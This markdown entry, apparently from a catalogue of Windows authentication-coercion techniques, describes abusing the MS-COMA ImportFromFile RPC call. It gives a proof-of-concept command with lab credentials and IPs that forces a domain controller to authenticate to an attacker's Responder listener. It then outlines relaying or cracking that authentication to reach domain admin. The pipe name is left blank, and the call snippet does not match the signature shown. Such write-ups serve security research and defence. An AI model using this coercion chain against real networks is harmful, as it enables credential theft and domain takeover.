# MS-COMA - Remote call to ImportFromFile (opnum 3)

## Summary

 - **Protocol**: [[MS-COMA]: Component Object Model Plus (COM+) Remote Administration Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c5b1ef02-e8f6-4195-9efe-9667928d1bdd)

 - **Protocol UUID**: 182c40fa-32e4-11d0-818b-00a0c9231c29

 - **Protocol version**: 0.0

 - **SMB Named pipe**: ``

 - **Function name**: [`ImportFromFile`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c81e49b8-6ffa-4872-a3ad-ef423fd58bdc)

 - **Function operation number**: `3`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-COMA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c5b1ef02-e8f6-4195-9efe-9667928d1bdd) protocol (with uuid `182c40fa-32e4-11d0-818b-00a0c9231c29` and version `0.0`) in order to perform remote procedure calls to functions in the [`MS-COMA`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c5b1ef02-e8f6-4195-9efe-9667928d1bdd) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-COMA]: Component Object Model Plus (COM+) Remote Administration Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c5b1ef02-e8f6-4195-9efe-9667928d1bdd) and allows to call RPC functions of this protocol. We will then call the remote [`ImportFromFile`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c81e49b8-6ffa-4872-a3ad-ef423fd58bdc) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
ImportFromFile('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
HRESULT ImportFromFile(
   [in, string, unique] WCHAR* pwszModuleDestination,
   [in, string] WCHAR* pwszInstallerPackage,
   [in, string, unique] WCHAR* pwszUser,
   [in, string, unique] WCHAR* pwszPassword,
   [in, string, unique] WCHAR* pwszRemoteServerName,
   [in] DWORD dwFlags,
   [in] GUID* reserved1,
   [in] DWORD reserved2,
   [out] DWORD* pcModules,
   [out, size_is(,*pcModules)] DWORD** ppModuleFlags,
   [out, string, size_is(,*pcModules)] 
     LPWSTR** ppModules,
   [out] DWORD* pcComponents,
   [out, size_is(,*pcComponents)] GUID** ppResultCLSIDs,
   [out, string, size_is(,*pcComponents)] 
     LPWSTR** ppResultNames,
   [out, size_is(,*pcComponents)] DWORD** ppResultFlags,
   [out, size_is(,*pcComponents)] LONG** ppResultHRs
 );
```

## References

 - Documentation of protocol [MS-COMA]: Component Object Model Plus (COM+) Remote Administration Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c5b1ef02-e8f6-4195-9efe-9667928d1bdd

 - Documentation of function `ImportFromFile`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-coma/c81e49b8-6ffa-4872-a3ad-ef423fd58bdc